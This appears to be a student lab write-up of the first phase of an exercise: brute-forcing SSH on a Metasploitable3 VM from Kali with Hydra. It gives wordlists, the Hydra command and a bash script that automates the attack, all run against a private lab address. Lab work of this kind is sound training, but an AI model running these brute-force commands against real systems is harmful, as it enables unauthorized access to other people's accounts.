# Phase #1 – Setup and Compromise the Service

## Objective

Set up the attacker and victim environments, then compromise a vulnerable SSH service using two methods:

- Phase 1.1: Brute-force attack using a wordlist (Hydra)
- Phase 1.2: Bash script with Hydra to automate the process

## Environment Setup

- Attacker Machine: Kali Linux

  Hostname: kali

  Host-Only IP Address: 192.168.56.104

  NAT IP Address: 10.0.2.15

  Username: kali

- Victim Machine: Metasploitable3

  Hostname: metasploitable3

  Host-Only IP Address: 192.168.56.103

  NAT IP Address: 10.0.2.2

  Username: vagrant

  Password: vagrant

## Targeted Service

- **Service:** SSH
- **Port:** 22
- **Vulnerability Type:** Weak/default credentials
- **Goal:** Compromise SSH access through brute-force login

## Phase 1.1 – Hydra Brute-Force Attack Using Wordlists

### 1. Connectivity Check

Confirmed Kali can reach Metasploitable3 via ping:

```bash
ping 192.168.56.103
```

[![Screenshot of results]](image-10.png)

### 2. Created Username and Password Lists

**user.txt**

```
msfadmin
user
postgres
vagrant
```

[![Screenshot of results]](image-8.png)

**pass.txt**

```
msfadmin
123456
toor
password
vagrant
```

[![Screenshot of results]](image-9.png)

### 3. Ran Hydra Using Both Files

Command used:

```bash
hydra -L user.txt -P pass.txt ssh://192.168.56.103 -t 4
```

Result:

- Hydra successfully found the credentials:
  - **Username:** `vagrant`
  - **Password:** `vagrant`
    [![Screenshot of results]](image-11.png)

## Phase 1.2 – Custom Scripted Attack (Hydra + Bash)

### 1. Created Bash Script

**ssh_bruteforce.sh**

```bash
#!/bin/bash
# Configuration
TARGET_IP="192.168.56.103"
USERNAME="vagrant"
PASSWORD_LIST="pass.txt"

# Run Hydra
echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
```

[![Screenshot of results]](image-7.png)

### 2. Ran the Script

```bash
chmod +x ssh_bruteforce.sh
./ssh_bruteforce.sh
```

Output confirmed the attack was successful with valid credentials found:

- **Username:** `vagrant`
- **Password:** `vagrant`
  [![Screenshot of results]](image-5.png)

## Conclusion

The SSH service on Metasploitable3 was successfully compromised using Hydra with both a custom wordlist and a Bash script. This confirms the service’s vulnerability to brute-force attacks due to the use of default credentials. The machine is now ready for defensive countermeasures.
